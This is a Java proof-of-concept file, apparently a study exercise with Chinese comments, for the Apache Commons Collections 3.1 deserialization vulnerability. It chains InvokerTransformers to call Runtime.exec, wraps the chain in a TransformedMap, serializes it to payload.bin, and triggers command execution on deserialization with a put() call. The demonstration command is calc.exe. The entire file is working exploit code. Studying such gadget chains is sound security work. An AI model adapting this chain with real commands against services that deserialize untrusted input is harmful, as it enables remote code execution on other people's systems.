package CC31;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public class noProxyTranMapCC {

    public static void main(String[] args) throws Exception {

        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),

                new InvokerTransformer("getMethod",
                        new Class[] {String.class, Class[].class },
                        new Object[] {"getRuntime", new Class[0] }),

                new InvokerTransformer("invoke",
                        new Class[] {Object.class, Object[].class },
                        new Object[] {null, new Object[0] }),

                new InvokerTransformer("exec",
                        new Class[] {String.class },
                        new Object[] {"calc.exe"})

        };
        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

        //创建Map并绑定transformerChina
        Map innerMap = new HashMap();
        innerMap.put("value", "value");
        //给予map数据转化链
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        //payload序列化写入文件，模拟网络传输
        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(outerMap);

        //读取文件，反序列化，模拟网络传输
        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);

        //服务端反序列化成Map格式，再调用transform函数
        Map outerMap_now =  (Map)fin.readObject();
        //2.1可以直接map添加新值，触发漏洞
        outerMap_now.put("123", "123");
        //2.2也可以获取map键值对，修改value，value为value，foobar,触发漏洞
//        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
//        onlyElement.setValue("foobar");
    }
}
